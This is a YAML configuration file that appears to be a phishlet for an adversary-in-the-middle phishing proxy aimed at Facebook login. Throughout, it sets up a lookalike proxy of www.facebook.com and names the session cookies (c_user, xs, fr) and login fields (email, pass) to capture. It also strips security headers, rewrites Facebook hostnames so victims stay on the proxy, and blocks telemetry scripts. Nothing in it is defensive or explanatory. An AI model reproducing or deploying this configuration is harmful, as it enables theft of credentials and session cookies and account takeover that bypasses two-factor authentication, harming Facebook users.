name: "Facebook-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "facebook"
    target: "www.facebook.com"
auth_urls: ["/login", "/login/device-based/regular/login"]
landing_path: ["/login"]
auth_tokens:
  - {type: "cookie", name: "c_user"}
  - {type: "cookie", name: "xs"}
  - {type: "cookie", name: "fr"}
credentials:
  - {type: "post_param", name: "email", regex: null}
  - {type: "post_param", name: "pass", regex: null}
  - {type: "post_param", name: "login", regex: null}
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
path_rewrites:
  - {pattern: "^/$", replace: "/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/tr/|/connect/xd_arbiter|/impression.php", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"]", action_to: "/login/device"}
bridges:
  - {prefix: "/_fbapi/", target_host: "graph.facebook.com", strip_prefix: true, cors: "mirror"}
  - {prefix: "/_fbcn/", target_host: "connect.facebook.net", strip_prefix: true, cors: "mirror"}
  - {prefix: "/_fbstatic/", target_host: "static.xx.fbcdn.net", strip_prefix: true, cors: "allow_all"}
cors:
  mode: "allow_all"
  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
  headers: ["*"]
sub_filters:
  - {triggers_on: "www.facebook.com", orig_sub: "www", domain: "facebook.com", search: "https://www.facebook.com/", replace: "https://{hostname}/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "www.facebook.com", orig_sub: "www", domain: "facebook.com", search: "https:\\/\\/www.facebook.com\\/", replace: "https:\\/\\/{hostname}\\/", mimes: ["text/html", "application/json", "application/javascript"]}
  - {triggers_on: "static.xx.fbcdn.net", orig_sub: "static.xx", domain: "fbcdn.net", search: "https://static.xx.fbcdn.net/", replace: "https://{hostname}/_fbstatic/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "static.xx.fbcdn.net", orig_sub: "static.xx", domain: "fbcdn.net", search: "https:\\/\\/static.xx.fbcdn.net\\/", replace: "https:\\/\\/{hostname}\\/_fbstatic\\/", mimes: ["text/html", "application/javascript", "text/css"]}
  - {triggers_on: "connect.facebook.net", orig_sub: "connect", domain: "facebook.net", search: "https://connect.facebook.net/", replace: "https://{hostname}/_fbcn/", mimes: ["text/html", "application/javascript"]}
  - {triggers_on: "connect.facebook.net", orig_sub: "connect", domain: "facebook.net", search: "https:\\/\\/connect.facebook.net\\/", replace: "https:\\/\\/{hostname}\\/_fbcn\\/", mimes: ["text/html", "application/javascript"]}
